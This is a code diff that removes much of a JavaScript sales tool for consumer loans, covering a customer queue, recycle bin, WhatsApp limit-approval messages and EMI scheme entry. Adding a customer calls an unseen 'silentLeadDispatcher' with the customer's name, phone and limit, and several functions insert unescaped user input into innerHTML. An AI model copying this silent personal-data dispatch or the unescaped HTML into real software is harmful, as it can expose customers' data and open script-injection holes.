-            warningEl.innerHTML = `🗑️ हा नंबर <b>Recycle Bin</b> मध्ये <b>'${recycledCust.name}'</b> नावाने पडलेला आहे! कृपया तिथे जाऊन <b>RESTORE</b> करा.`;
-            warningEl.style.display = 'block';
-            mobileInp.style.borderColor = 'var(--warning)';
-            mobileInp.style.background = '#fffbf0';
-
-            addBtn.disabled = true;
-            addBtn.style.opacity = '0.5';
-            addBtn.style.cursor = 'not-allowed';
-            addBtn.style.background = 'gray';
-
-            if (queueSearchInp && queueSearchInp.value === cleanVal) {
-                queueSearchInp.value = '';
-                renderCustomerQueue();
-            }
-            return;
-        }
-    }
-
-    warningEl.style.display = 'none';
-    mobileInp.style.borderColor = '#ccc';
-    mobileInp.style.background = '#fff';
-
-    addBtn.disabled = false;
-    addBtn.style.opacity = '1';
-    addBtn.style.cursor = 'pointer';
-    addBtn.style.background = 'var(--success)';
-
-    if (queueSearchInp && queueSearchInp.value === cleanVal) {
-        queueSearchInp.value = '';
-        renderCustomerQueue();
-    }
-}
-
-async function addCustomerToQueue() {
-    let name = document.getElementById('cqName').value.trim() || `Cust ${customerQueue.length + 1}`; 
-    let mobile = document.getElementById('cqMobile').value.trim() || ""; 
-    let limit = parseFloat(document.getElementById('cqLimit').value); 
-    let ltv = parseFloat(document.getElementById('cqLtv').value) || 100; 
-    let type = document.getElementById('cqType').value; 
-    let cap = parseFloat(document.getElementById('cqCap').value) || "";
-    
-    if(!limit || limit <= 0 || isNaN(limit)) { 
-        showToast("⚠️ Customer add karne ke liye pehle ek valid NBFC LIMIT enter karein!", "error"); 
-        return; 
-    }
-    
-    let now = new Date(); 
-    let ts = now.toLocaleDateString('en-GB', {day:'2-digit', month:'short'}) + ' ' + now.toLocaleTimeString('en-US', {hour:'2-digit', minute:'2-digit'});
-    let newCustObj = { name, mobile, limit, ltv, type, cap, timestamp: ts, components: {}, products: [], sortConfigs: [] };
-    
-    customerQueue.unshift(newCustObj); 
-    silentLeadDispatcher(newCustObj);
-    
-    if (activeCustomerIndex !== -1) activeCustomerIndex++; 
-    if (selectedQueueIndex !== -1) selectedQueueIndex++;
-    
-    await saveQueueToLocal(); 
-
-    document.getElementById('cqName').value = ''; 
-    document.getElementById('cqMobile').value = ''; 
-    document.getElementById('cqLimit').value = ''; 
-    document.getElementById('cqCap').value = '';
-
-    let warnEl = document.getElementById('mobileDupWarning'); if(warnEl) warnEl.style.display = 'none';
-    let mobInp = document.getElementById('cqMobile'); if(mobInp) { mobInp.style.borderColor = '#ccc'; mobInp.style.background = '#fff'; }
-    let addBtn = document.getElementById('addToQueueBtn'); if(addBtn) { addBtn.disabled = false; addBtn.style.opacity = '1'; addBtn.style.cursor = 'pointer'; addBtn.style.background = 'var(--success)'; }
-
-    renderCustomerQueue(); 
-    updateUniversalActionButtons();
-    showToast("✅ Customer Queue मध्ये ॲड झाला!", "success");
-}
-
-function copyCustomerDetails(idx, btnElement) { let c = customerQueue[idx]; let cappingLine = (c.cap && c.cap !== "") ? `\nEMI CAPPING- ${c.cap}` : ""; let textToCopy = `CUSTOMER NAME- ${c.name}\nNUMBER- ${c.mobile || ''}\nLIMIT- ${c.limit}\nLTV- ${c.ltv}${cappingLine}`; function showSuccess() { let originalText = btnElement.innerText; btnElement.innerText = "COPIED!"; btnElement.style.background = "var(--success)"; btnElement.style.color = "white"; setTimeout(() => { btnElement.innerText = originalText; btnElement.style.background = "var(--warning)"; btnElement.style.color = "#000"; }, 2000); } if (navigator.clipboard && window.isSecureContext) { navigator.clipboard.writeText(textToCopy).then(showSuccess).catch(() => fallbackCopy(textToCopy, showSuccess)); } else { fallbackCopy(textToCopy, showSuccess); } }
-function maskName(str) { if (!str || str === "-") return str; return str.split(' ').map(word => { if (word.length <= 2) return word; return word[0] + '*'.repeat(word.length - 2) + word[word.length - 1]; }).join(' '); }
-function selectQueueItem(idx) { selectedQueueIndex = idx; renderCustomerQueue(); updateUniversalActionButtons(); }
-
-function updateUniversalActionButtons() {
-    let copyB = document.getElementById('uniCopyBtn'); let selB = document.getElementById('uniSelectBtn'); let editB = document.getElementById('uniEditBtn'); let delB = document.getElementById('uniDeleteBtn'); let invB = document.getElementById('uniInviteBtn');
-    if (selectedQueueIndex !== -1 && customerQueue[selectedQueueIndex]) { copyB.style.opacity = '1'; copyB.style.pointerEvents = 'auto'; selB.style.opacity = '1'; selB.style.pointerEvents = 'auto'; editB.style.opacity = '1'; editB.style.pointerEvents = 'auto'; delB.style.opacity = '1'; delB.style.pointerEvents = 'auto'; invB.style.opacity = '1'; invB.style.pointerEvents = 'auto'; } 
-    else { copyB.style.opacity = '0.5'; copyB.style.pointerEvents = 'none'; selB.style.opacity = '0.5'; selB.style.pointerEvents = 'none'; editB.style.opacity = '0.5'; editB.style.pointerEvents = 'none'; delB.style.opacity = '0.5'; delB.style.pointerEvents = 'none'; invB.style.opacity = '0.5'; invB.style.pointerEvents = 'none'; }
-}
-
-function uniCopy() { if(selectedQueueIndex !== -1) copyCustomerDetails(selectedQueueIndex, document.getElementById('uniCopyBtn')); }
-function uniSelect() { if(selectedQueueIndex !== -1) setActiveCustomer(selectedQueueIndex); }
-function uniEdit() { if(selectedQueueIndex === -1) return; let c = customerQueue[selectedQueueIndex]; document.getElementById('ecName').value = c.name; document.getElementById('ecMobile').value = c.mobile || ''; document.getElementById('ecLimit').value = c.limit; document.getElementById('ecLtv').value = c.ltv || 100; document.getElementById('ecType').value = c.type; document.getElementById('ecCap').value = c.cap || ''; document.getElementById('editCustomerModal').style.display='flex'; }
-function uniInvite() { if(selectedQueueIndex === -1) return; let c = customerQueue[selectedQueueIndex]; if(!c.mobile || c.mobile.length < 10) { showToast("⚠️ Kripya Customer ka valid 10 digit mobile number update karein!", "error"); return; } document.getElementById('invSenderName').value = localStorage.getItem('portal_sales_name') || ""; document.getElementById('invSenderMobile').value = localStorage.getItem('portal_sales_mobile') || ""; document.getElementById('inviteModal').style.display = 'flex'; }
-function sendWhatsAppInvite() { let sName = document.getElementById('invSenderName').value.trim(); let sMobile = document.getElementById('invSenderMobile').value.trim(); if(!sName || !sMobile) { showToast("⚠️ Kripya apna Naam aur Number dalein!", "error"); return; } localStorage.setItem('portal_sales_name', sName); localStorage.setItem('portal_sales_mobile', sMobile); let c = customerQueue[selectedQueueIndex]; let msg = `Namaskar ${c.name} sir/madam! 🎉\n\nAapki Bajaj Finance ki *₹${c.limit}* ki limit approve ho gayi hai! 🥳\n\nAb intezaar kis baat ka? Aaj hi apni pasand ki cheez kharidne ke liye dukan par zaroor visit karein. 🛍️✨\n\n👤 *${sName}*\n📞 ${sMobile}`; let encMsg = encodeURIComponent(msg); window.open(`https://wa.me/91${c.mobile}?text=${encMsg}`, '_blank'); document.getElementById('inviteModal').style.display = 'none'; }
-function closeCustomerEdit() { document.getElementById('editCustomerModal').style.display='none'; }
-
-async function saveCustomerEdit() { if(selectedQueueIndex === -1) return; let c = customerQueue[selectedQueueIndex]; c.name = document.getElementById('ecName').value || 'Customer'; c.mobile = document.getElementById('ecMobile').value; c.limit = parseFloat(document.getElementById('ecLimit').value) || 0; c.ltv = parseFloat(document.getElementById('ecLtv').value) || 100; c.type = document.getElementById('ecType').value; let cap = parseFloat(document.getElementById('ecCap').value); c.cap = cap > 0 ? cap : ''; await saveQueueToLocal(); renderCustomerQueue(); if(activeCustomerIndex === selectedQueueIndex) { updateMatrixTopCard(); current_products.forEach((_, idx) => recalcModel(idx)); } closeCustomerEdit(); }
-async function uniDelete() { if(selectedQueueIndex !== -1) await removeCustomer(selectedQueueIndex); }
-async function removeCustomer(idx) { let c = customerQueue[idx]; recycleBin.push(c); await saveToDB('persistent_recycle', recycleBin); localStorage.setItem('persistent_recycle_backup', JSON.stringify(recycleBin)); if(activeCustomerIndex === idx) activeCustomerIndex = -1; else if (activeCustomerIndex > idx) activeCustomerIndex--; customerQueue.splice(idx, 1); if (selectedQueueIndex === idx) selectedQueueIndex = -1; else if (selectedQueueIndex > idx) selectedQueueIndex--; if(customerQueue.length > 0 && activeCustomerIndex === -1) activeCustomerIndex = 0; await saveQueueToLocal(); renderCustomerQueue(); updateUniversalActionButtons(); }
-
-function openRecycleBin() { let list = document.getElementById('recycleBinList'); if(recycleBin.length === 0) { list.innerHTML = `<div style="text-align:center; color:#888;">Recycle Bin empty</div>`; } else { list.innerHTML = recycleBin.map((c, i) => ` <div style="display:flex; justify-content:space-between; align-items:center; background:#fff; padding:8px; border-radius:4px; border:1px solid #ddd;"> <div style="font-size:12px; color:var(--dark); font-weight:bold;"> 👤 ${c.name} <br><span style="color:var(--success);">LMT: ₹${c.limit}</span> </div> <button onclick="restoreCustomer(${i})" style="background:var(--primary); color:white; padding:6px; border-radius:3px;">↩️ RESTORE</button> </div> `).join(''); } document.getElementById('recycleBinModal').style.display='flex'; }
-function closeRecycleBin() { document.getElementById('recycleBinModal').style.display='none'; }
-async function restoreCustomer(idx) { let c = recycleBin.splice(idx, 1)[0]; customerQueue.unshift(c); if(activeCustomerIndex !== -1) activeCustomerIndex++; if(selectedQueueIndex !== -1) selectedQueueIndex++; await saveQueueToLocal(); await saveToDB('persistent_recycle', recycleBin); localStorage.setItem('persistent_recycle_backup', JSON.stringify(recycleBin)); openRecycleBin(); renderCustomerQueue(); updateUniversalActionButtons(); }
-
-async function emptyRecycleBin() {
-    if(recycleBin.length === 0) { showToast("⚠️ Recycle bin pehle से hi empty hai!", "warning"); return; }
-    showCustomConfirm("Are you sure you want to permanently delete all items in the Recycle Bin?", async () => { recycleBin = []; await saveToDB('persistent_recycle', recycleBin); localStorage.setItem('persistent_recycle_backup', JSON.stringify(recycleBin)); openRecycleBin(); showToast("🗑️ Recycle Bin completely emptied!", "success"); });
-}
-
-function renderCustomerQueue() { 
-    let documentCount = document.getElementById('queueCount'); 
-    if(documentCount) documentCount.innerText = customerQueue.length; 
-    
-    let list = document.getElementById('customerQueueList'); 
-    if(!list) return; 
-    
-    let qSearch = document.getElementById('queueSearch').value.toLowerCase().trim(); 
-    let isSearching = qSearch !== ""; 
-    
-    let filtered = customerQueue.map((c, idx) => ({...c, originalIdx: idx})).filter(c => { 
-        if(!isSearching) return true; 
-        return c.name.toLowerCase().includes(qSearch) || (c.mobile && c.mobile.includes(qSearch)) || c.limit.toString().includes(qSearch) || (c.cap && c.cap.toString().includes(qSearch)) || c.type.toLowerCase().includes(qSearch); 
-    }); 
-    
-    if(filtered.length === 0) { 
-        list.innerHTML = `<div style="text-align:center; color:#888;">No customers found.</div>`; 
-        return; 
-    } 
-    
-    list.innerHTML = filtered.map((c) => { 
-        let idx = c.originalIdx; 
-        let isSelected = (selectedQueueIndex === idx); 
-        let isActive = (activeCustomerIndex === idx); 
-        let displayName = (isSearching || isSelected) ? c.name : maskName(c.name); 
-        let bgStyle = isSelected ? '#e3f2fd' : (isActive ? '#f0f8ff' : '#fff'); 
-        let borderStyle = isSelected ? 'var(--primary)' : (isActive ? '#0088cc' : '#ddd'); 
-        let shadowStyle = isSelected ? '0 0 5px rgba(9, 132, 227, 0.5)' : (isActive ? '0 0 5px rgba(0, 136, 204, 0.3)' : 'none'); 
-        
-        return ` <div onclick="handleCustomerTap(${idx})" style="cursor:pointer; display:flex; flex-direction:column; background:${bgStyle}; padding:8px; border-radius:4px; border:1px solid ${borderStyle}; box-shadow:${shadowStyle}; transition:0.2s;"> 
-            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;"> 
-                <strong style="color:var(--indigo);">👤 ${displayName} ${c.mobile ? `<span style="color:#d35400; cursor:text;" title="Double-click to select" ondblclick="highlightNumber(event, this.querySelector('.mob-num'))">(📞 <span class="mob-num">${c.mobile}</span>)</span>` : ''}</strong> 
-                <span style="color:#888; font-weight:bold;">${c.timestamp || ''}</span> 
-            </div> 
-            <div style="color:#555; font-weight:bold;"> 
-                LMT: <span style="color:var(--success)">₹${c.limit}</span> | LTV: ${c.ltv}% | CAP: ${c.cap ? '₹'+c.cap : 'NO'} | ${c.type} ${isActive ? '<span style="float:right; color:var(--primary);">[ACTIVE ✓]</span>' : ''} 
-            </div> 
-        </div>`; 
-    }).join(''); 
-}
-async function setActiveCustomer(idx) { if(db_records.length === 0) { showToast("⚠️ Master Stream se data fetch nahi hua hai. Kripya connection check karein!", "error"); return; } activeCustomerIndex = idx; await saveQueueToLocal(); document.getElementById('queueSearch').value = ''; goToFinalPage(); }
-function isLimitValid() { if (activeCustomerIndex === -1 || !customerQueue[activeCustomerIndex]) { showToast("⚠️ Kripya pehle queue mein ek customer add karein aur use 'ACTIVE' rakhein.", "warning"); return false; } return true; }
-
-function generateStackCards() { let container = document.getElementById('stackInputsContainer'); if(!container) return; container.innerHTML = ""; for(let i=1; i<=10; i++) { container.innerHTML += ` <div class="stack-card"><div style="font-weight:900; color:var(--primary); margin-bottom:4px; border-bottom:1px solid #eee; padding-bottom:2px;">SCHEME #${i}</div> <div class="inner-grid"> <div><label>TENURE (MAX)</label><input type="number" id="msTen_${i}" placeholder="0"></div> <div><label>ADVANCE</label><input type="number" id="msAdv_${i}" placeholder="0"></div> <div><label>DBD %</label><input type="number" id="msDbd_${i}" placeholder="0"></div> <div><label>PF (₹)</label><input type="number" id="msPf_${i}" placeholder="0"></div> <div><label>ROI %</label><input type="number" id="msRoi_${i}" placeholder="0"></div> <div><label>FIXED EMI (₹)</label><input type="number" id="msFix_${i}" placeholder="0"></div> </div> </div>`; } }
-function openMultiStackModal() { if (!isLimitValid()) return; document.getElementById('addProductModal').style.display='none'; document.getElementById('multiStackModal').style.display='flex'; }
-function closeMultiStackModal() { document.getElementById('multiStackModal').style.display='none'; }
-
-async function processMultiStack() {
-    let modelName = document.getElementById('multiStackModelName').value.trim().toUpperCase(); if (!modelName) { showToast("⚠️ Kripya Product Model Name zaroor enter karein!", "error"); return; } let validSchemes = [];
-    for(let i=1; i<=10; i++) { let ten = parseInt(document.getElementById(`msTen_${i}`).value) || 0; let fix = parseInt(document.getElementById(`msFix_${i}`).value) || 0; if(ten > 0 || fix > 0) { validSchemes.push({ tenure: ten, advEmi: parseInt(document.getElementById(`msAdv_${i}`).value) || 0, dbd: parseFloat(document.getElementById(`msDbd_${i}`).value) || 0, pf: parseInt(document.getElementById(`msPf_${i}`).value) || 0, roi: parseFloat(document.getElementById(`msRoi_${i}`).value) || 0, fixedEmi: fix, minLoan: 0, maxLoan: 9999999, category: "MANUAL", inactive: false, isExpired: false, expiryDateStr: "" }); } }
-    if(validSchemes.length > 0) { let comp = customerQueue[activeCustomerIndex].components || {}; current_products.push({ name: modelName, schemes: validSchemes, category: "MANUAL", inputs: { mrp: comp.mrp||"", inv: comp.inv||"", cap: comp.cap||(customerQueue[activeCustomerIndex]?.cap || ""), target: comp.target||"", gtl: comp.gtl||0, rfc: comp.rfc||0, exw: comp.exw||"", margin: comp.margin||"", dealer: comp.dealer||"", surch: 0, manualLoans: {} }, isManual: true, isNonTieup: false }); sortConfigs.push({ key: 'dp', dir: 'asc' }); customerQueue[activeCustomerIndex].products = current_products; customerQueue[activeCustomerIndex].sortConfigs = sortConfigs; await saveQueueToLocal(); closeMultiStackModal(); renderMatrix(); } else { showToast("⚠️ Kripya kam se kam ek Scheme ki details zaroor fill karein!", "error"); }
-}
-
-function findValLocal(row, targets) { let key = Object.keys(row).find(k => targets.includes(k.toUpperCase().replace(/\s/g, ''))); return key ? row[key] : null; }
-function mapData(row, type) { 
-    if(!row) return null; 
-    let expVal = findValLocal(row, ['EXPIRY', 'EXPIRYDATE', 'VALIDTILL', 'SCHEMEEXPIRY', 'ENDDATE']); 
-    let expDate = parseExcelDate(expVal); 
-    let isExp = false; let expiryDateStr = ""; 
-    if(expDate) { 
-        let today = new Date(); today.setHours(0,0,0,0); 
-        if(expDate < today) isExp = true; 
-        let dd = String(expDate.getDate()).padStart(2, '0'); let mm = String(expDate.getMonth() + 1).padStart(2, '0'); let yyyy = expDate.getFullYear(); expiryDateStr = `${dd}/${mm}/${yyyy}`; 
-    } 
-    if(isExp) return null; 
-    return { model: type === SPECIAL_MODEL ? SPECIAL_MODEL : String(findValLocal(row,['MODEL','BRANDMODEL'])||"").toUpperCase(), brand: String(findValLocal(row, ['BRAND', 'MAKE', 'MANUFACTURER'])||"").toUpperCase(), mrp: parseFloat(findValLocal(row, ['MRP', 'PRICE', 'M.R.P'])) || 0, tenure: parseInt(findValLocal(row, ['TOTALTENURE', 'TENURE', 'TA'])) || 0, advEmi: parseInt(findValLocal(row, ['ADVANCEEMI', 'ADV'])) || 0, dbd: parseFloat(findValLocal(row,['DBD','DBD%'])||0), pf: parseInt(findValLocal(row,['PF','PROCESSINGFEE'])||0), roi: parseFloat(findValLocal(row,['ROI','ROI%'])||0), fixedEmi: parseFloat(findValLocal(row,['FIXEDEMI', 'FIXED'])||0), category: standardizeCategoryName(findValLocal(row,['CATEGORY','CAT'])||""), minLoan: parseFloat(findValLocal(row, ['MINLOAN', 'MINL'])) || 0, maxLoan: parseFloat(findValLocal(row, ['MAXLOAN', 'MAXL'])) || 9999999, isExpired: isExp, expiryDateStr: expiryDateStr, inactive: false }; 
-}
-
-function goHome() { document.getElementById('finalEligibleArea').style.display='none'; document.getElementById('catSelectionModal').style.display='none'; document.getElementById('unifiedHome').style.display='flex'; activeCustomerIndex = -1; selectedQueueIndex = -1; renderCustomerQueue(); updateUniversalActionButtons(); window.scrollTo({ top: 0, behavior: 'smooth' }); }
-function closeImageViewer() { document.getElementById('imageViewerModal').style.display='none'; }
-function openAddProductModal() { if (!isLimitValid()) return; document.getElementById('modalMatrixSearch').value = ''; document.getElementById('modalMatrixSearchDropdown').style.display = 'none'; document.getElementById('addProductModal').style.display = 'flex'; }
-function openSchemeOnlyModal(pIdx) { if (!isLimitValid()) return; document.getElementById('modalTitle').innerText = "Add Custom Scheme"; document.getElementById('modelNameInputArea').style.display = 'none'; document.getElementById('targetPIdx').value = pIdx; document.getElementById('manualModal').style.display='flex'; }
-function closeManualModal() { document.getElementById('manualModal').style.display='none'; }
-function openEditSchemeModal(pIdx, dIdx) { let scheme = current_products[pIdx].schemes[dIdx]; document.getElementById('editPIdx').value = pIdx; document.getElementById('editDIdx').value = dIdx; document.getElementById('editTen').value = scheme.tenure || 0; document.getElementById('editAdv').value = scheme.advEmi || 0; document.getElementById('editDbd').value = scheme.dbd || 0; document.getElementById('editPf').value = scheme.pf || 0; document.getElementById('editRoi').value = scheme.roi || 0; document.getElementById('editFixed').value = scheme.fixedEmi || 0; document.getElementById('editSchemeModal').style.display = 'flex'; }
-function closeEditSchemeModal() { document.getElementById('editSchemeModal').style.display = 'none'; }
-function saveSchemeEdit() { let pIdx = parseInt(document.getElementById('editPIdx').value); let dIdx = parseInt(document.getElementById('editDIdx').value); let scheme = current_products[pIdx].schemes[dIdx]; scheme.tenure = parseInt(document.getElementById('editTen').value) || 0; scheme.advEmi = parseInt(document.getElementById('editAdv').value) || 0; scheme.dbd = parseFloat(document.getElementById('editDbd').value) || 0; scheme.pf = parseInt(document.getElementById('editPf').value) || 0; scheme.roi = parseFloat(document.getElementById('editRoi').value) || 0; scheme.fixedEmi = parseFloat(document.getElementById('editFixed').value) || 0; closeEditSchemeModal(); recalcModel(pIdx); }
-
-function doSearch(id, ddId) {
-    let q = document.getElementById(id).value.toUpperCase().trim(); let dd = document.getElementById(ddId); if(!q) { dd.style.display='none'; return; }
-    let validRecords = db_records.filter(r => r.model !== SPECIAL_MODEL); let matches = validRecords.filter(r => { let m = r.model || ""; let b = r.brand || ""; let c = r.category || ""; return m.includes(q) || b.includes(q) || c.includes(q); }).map(r => r.model); matches = [...new Set(matches)].slice(0, 15);
-    if (matches.length === 0) { dd.innerHTML = `<div style="padding:10px; color:#d35400; font-weight:bold; text-align:center;">No matching models found.</div>`; dd.style.display = 'block'; return; }
-    dd.innerHTML = matches.map(m => { let rec = validRecords.find(x => x.model === m); let brandTag = rec && rec.brand ? `<span style="font-size:10px; color:#0984e3; font-weight:900; margin-right:5px;">[${rec.brand}]</span>` : ''; return `<div style="padding:10px; border-bottom:1px solid #eee; cursor:pointer; font-weight:800;" onclick="selectModel('${m}')">${brandTag}${m}</div>`; }).join(''); dd.style.display = 'block';
-}
-
-function selectModel(name) { if (!isLimitValid()) return; let raw = db_records.filter(r => r.model === name); let baseMrp = raw.find(s => s.mrp > 0)?.mrp || ""; let cat = raw[0]?.category || ""; tempPendingProduct = { name: name, isNT: false, category: cat }; currentModalCategory = cat; document.getElementById('modalMatrixSearchDropdown').style.display = 'none'; document.getElementById('modalMatrixSearch').value = ''; document.getElementById('addProductModal').style.display = 'none'; showComponentsModal(baseMrp); }
-function quickNonTieup() { if (!isLimitValid()) return; if(db_records.length === 0) { showToast("⚠️ Master database fetch me error hai!", "error"); return; } document.getElementById('addProductModal').style.display = 'none'; let tieup = db_records.filter(r => r.model === SPECIAL_MODEL); let cats = [...new Set(tieup.map(r => r.category))].sort(); document.getElementById('categoryGrid').innerHTML = cats.map(c => { let label = (c === 'PHONE(WEB-MOBILE)') ? 'PHONE, TABLET, SMART WATCH' : c; return `<div style="background:var(--indigo);color:white;padding:12px;border-radius:4px;cursor:pointer;font-weight:900;text-align:center;" onclick="selectCategory('${c}')">${label}</div>`; }).join(''); document.getElementById('catSelectionModal').style.display = 'flex'; }
-function selectCategory(catName) { document.getElementById('catSelectionModal').style.display = 'none'; let displayName = (catName === 'PHONE(WEB-MOBILE)') ? 'PHONE / TABLET / SMART WATCH' : catName; tempPendingProduct = { name: SPECIAL_MODEL + " - " + displayName, isNT: true, category: catName }; currentModalCategory = catName; finalizeProductAddition(); }
 
 function compMrpChanged() { let mrp = parseFloat(document.getElementById('compMrp').value) || 0; document.getElementById('compInv').value = mrp; let gtl = mrp > 100000 ? 2398 : (mrp > 50000 ? 1799 : (mrp > 30000 ? 1499 : (mrp > 10000 ? 1199 : (mrp > 0 ? 699 : 0)))); document.getElementById('compGtl').value = gtl; let rfcSlab = getRfcSlabValue(mrp); let rfcOpt = document.getElementById('compRfcOpt'); if(rfcOpt) { rfcOpt.value = rfcSlab; rfcOpt.innerText = rfcSlab; } if (isMobileDeviceCat(currentModalCategory)) { document.getElementById('compRfc').value = rfcSlab; } else { document.getElementById('compRfc').value = "0"; } }
 
@@ -1901,8 +1533,8 @@ function searchDealer() {
         let isStarred = starredIds.includes(dId);
 
         let favBtnHtml = isStarred 
-            ? `<button onclick="toggleDealerStar('${dId}', event)" style="background:#fff3cd; color:#856404; border:1px solid #ffeeba; padding:4px 8px; border-radius:4px; font-size:10px; font-weight:bold; cursor:pointer;">⭐ FAVORITED</button>`
-            : `<button onclick="toggleDealerStar('${dId}', event)" style="background:#f8f9fa; color:#555; border:1px solid #ccc; padding:4px 8px; border-radius:4px; font-size:10px; font-weight:bold; cursor:pointer;">☆ ADD FAV</button>`;
+            ? `<button onclick="toggleDealerStar('${dId}', event)" style="background:#fff3cd; color:#856404; border:1px solid #ffeeba; padding:4px 8px; border-radius:4px; font-weight:bold; cursor:pointer;">⭐ FAVORITED</button>`
+            : `<button onclick="toggleDealerStar('${dId}', event)" style="background:#f8f9fa; color:#555; border:1px solid #ccc; padding:4px 8px; border-radius:4px; font-weight:bold; cursor:pointer;">☆ ADD FAV</button>`;
 
         let linkBtnHtml = validLink 
             ? `<a href="${validLink}" target="_blank" rel="noopener noreferrer" onclick="closeDealerSearchModal()" style="flex:1; background:var(--success); color:white; border:none; padding:8px 6px; border-radius:4px; font-weight:bold; cursor:pointer; font-size:11px; text-decoration:none; text-align:center; display:inline-block;">OPEN LINK ↗</a>`
@@ -2031,9 +1663,6 @@ document.addEventListener('click', function() {
     });
 });
 
-// ==========================================
-// GLOBAL ELIGIBILITY SYSTEM (ZATPAT & DICTIONARY)
-// ==========================================
 let zcEligibleActive = false;
 let zcLimit = 0;
 let zcLtv = 100;
